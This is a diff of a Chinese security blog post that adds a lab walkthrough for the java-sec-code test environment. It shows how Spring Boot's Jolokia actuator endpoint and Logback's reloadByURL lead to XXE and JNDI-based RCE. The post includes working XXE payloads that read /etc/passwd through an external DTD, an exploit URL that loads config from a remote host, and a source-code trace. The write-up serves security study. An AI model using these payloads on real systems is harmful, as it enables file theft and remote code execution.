@@ -6,7 +6,8 @@
     <meta charset="utf-8">
     <meta name="keywords" content="java-sec-code环境测试指北, J1an&#39;s Little World">
     <meta name="description" content="好棒的测试环境，几乎涵盖所有类型的java漏洞了，首先要感谢一下JoyChou师傅的环境：https://github.com/JoyChou93/java-sec-code
-">
+让我们一个个看过去
+Actuators to RCE首先我们要了">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -378,6 +379,73 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <p>好棒的测试环境，几乎涵盖所有类型的java漏洞了，首先要感谢一下JoyChou师傅的环境：<a target="_blank" rel="noopener" href="https://github.com/JoyChou93/java-sec-code">https://github.com/JoyChou93/java-sec-code</a></p>
+<p>让我们一个个看过去</p>
+<h2 id="Actuators-to-RCE"><a href="#Actuators-to-RCE" class="headerlink" title="Actuators to RCE"></a>Actuators to RCE</h2><p>首先我们要了解一下Spring Boot Actuator是什么</p>
+<blockquote>
+<p>Spring Boot Actuator是Spring Boot提供用于对应用系统进行自省和监控的功能模块，基于此开发人员可以方便地对应用系统某些监控指标进行查看、统计、审计、指标收集等。 Actuator提供了基于Http端点或JMX来管理和监视应用程序</p>
+</blockquote>
+<p>说白了就是一个针对于Spring Boot的管理程序，可以直接通过http管理监视SpringBoot应用程序</p>
+<p>那么RCE是怎么实现的呢，我们首先看下第一种方式</p>
+<ol>
+<li><p><strong>jolokia</strong></p>
+<p>如果我们的程序调用了jolokia库，那么Spring Boot会自动注册<code>/jolokia</code>路由，Jolokia允许HTTP访问所有注册的MBean，并旨在执行与JMX相同的操作。可以使用URL列出所有可用的MBeans操作：</p>
+<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202301012212445.png"></p>
+<p>出问题的点在哪里呢，是Logback库提供的“<strong>reloadByURL</strong>”操作，这个操作允许我们从外部URL重新加载日志配置。它可以通过导航到以下方式触发：<a target="_blank" rel="noopener" href="http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!!/artsploit.com!/logback.xml">http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!!/artsploit.com!/logback.xml</a></p>
+<p>那么我们修改日志配置有什么用呢？首先是这个配置文件使用的是xml格式，所以很明显我们可以通过XXE来实现任意文件读取，其次，对于Logback来说，它可以通过JNDI来获得相关变量，所以我们可以写入一个类似于 <code>&lt;insertFromJNDI env-entry-name=&quot;java:comp/env/appName&quot; as=&quot;appName&quot; /&gt;</code>的标签来实现JNDI注入进而RCE</p>
+<p>首先来看XXE，构造两个文件</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">#logback.xml
+<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span> <span class="token punctuation">[</span><span class="token internal-subset"> &lt;!ENTITY % remote SYSTEM "http://127.0.0.1:8000/file.dtd">%remote;%int;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&trick;">&amp;trick;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd"># file.dtd
+&lt;!ENTITY % d SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; 
+&lt;!ENTITY % int &quot;&lt;!ENTITY trick SYSTEM &#39;:%d;&#39;&gt;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>然后我们构造如下url<code>/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/127.0.0.1:8000!/logback.xml</code></p>
+<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202301012321677.png"></p>
+<p>访问就有回显，我们来分析一下url构成</p>
+<p>首先是jolokia的路径注册</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">JolokiaMvcEndpoint</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+   <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token string">"jolokia"</span><span class="token punctuation">,</span> <span class="token string">"/jolokia"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token keyword">this</span><span class="token punctuation">.</span>controller<span class="token punctuation">.</span><span class="token function">setServletClass</span><span class="token punctuation">(</span><span class="token class-name">AgentServlet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token keyword">this</span><span class="token punctuation">.</span>controller<span class="token punctuation">.</span><span class="token function">setServletName</span><span class="token punctuation">(</span><span class="token string">"jolokia"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>只要/jolokia开头就能进入其逻辑中，我们在来看其中对路径进行处理的内容<code>org.jolokia.http.HttpRequestHandler#handleGetRequest</code></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">JSONAware</span> <span class="token function">handleGetRequest</span><span class="token punctuation">(</span><span class="token class-name">String</span> pUri<span class="token punctuation">,</span> <span class="token class-name">String</span> pPathInfo<span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token operator">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> pParameterMap<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token class-name">String</span> pathInfo <span class="token operator">=</span> <span class="token function">extractPathInfo</span><span class="token punctuation">(</span>pUri<span class="token punctuation">,</span> pPathInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token class-name">JmxRequest</span> jmxReq <span class="token operator">=</span>
+            <span class="token class-name">JmxRequestFactory</span><span class="token punctuation">.</span><span class="token function">createGetRequest</span><span class="token punctuation">(</span>pathInfo<span class="token punctuation">,</span><span class="token function">getProcessingParameter</span><span class="token punctuation">(</span>pParameterMap<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>backendManager<span class="token punctuation">.</span><span class="token function">isDebug</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        logHandler<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"URI: "</span> <span class="token operator">+</span> pUri<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        logHandler<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"Path-Info: "</span> <span class="token operator">+</span> pathInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        logHandler<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"Request: "</span> <span class="token operator">+</span> jmxReq<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">return</span> <span class="token function">executeRequest</span><span class="token punctuation">(</span>jmxReq<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里我们会创建exec对应的<code>org.jolokia.request.JmxExecRequest</code>类对象，并将内容放入executeRequest中执行</p>
+<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202301012353787.png"></p>
+<p>可以看到已经将我们的URL进行解析了，最终其执行过程为将 JmxExecRequst 中的 operation 做参数类型鉴定，然后根据目标函数需要的参数类型，将 arguments 转换成对应类型，最后执行 server.invoke 的调用，这个调用就是执行我们指定的类中的指定的函数，那这里是不是能够任意类和任意函数都能执行呢，不是的，需要提前注册，注册的内容可以通过 <code>/jolokia/list</code> 查看，这也是我们要通过list查看是否有reloadByURL的原因，下一步我们就是来看reloadByURL函数</p>
+<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202301012356546.png"></p>
+<p>可以看到这个函数要求传入的参数是URL格式，不过我们上一步解析过程中已经自动将string类型转换为了URL类型，我们直接跟入<code>doConfigure</code>函数</p>
+<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202301012358782.png"></p>
+<p>可以看到其从url中获取流后进入下一个<code>doConfigure</code>函数</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">doConfigure</span><span class="token punctuation">(</span><span class="token class-name">InputStream</span> inputStream<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">JoranException</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">doConfigure</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputSource</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>转换了下类型，继续</p>
+<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202301020001618.png"></p>
+<p>这里在recordEvents中对xml内容进行了解析，触发XXE</p>
+<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202301020001231.png"></p>
+<p>那么RCE的内容在哪，就是我们之前说的jolokia会从JNDI中获取变量</p>
+<p><img src="https://www.hacking8.com/books/bug-product/Spring-Boot/376/media/rId41.png" alt="https://www.hacking8.com/books/bug-product/Spring-Boot/376/media/rId41.png"></p>
+</li>
+</ol>
 <script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">
                 
             </div>
@@ -684,7 +752,7 @@
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2022</span>
+                <span id="year">2022-2023</span>
             
             <a href="/about" target="_blank">J1an</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
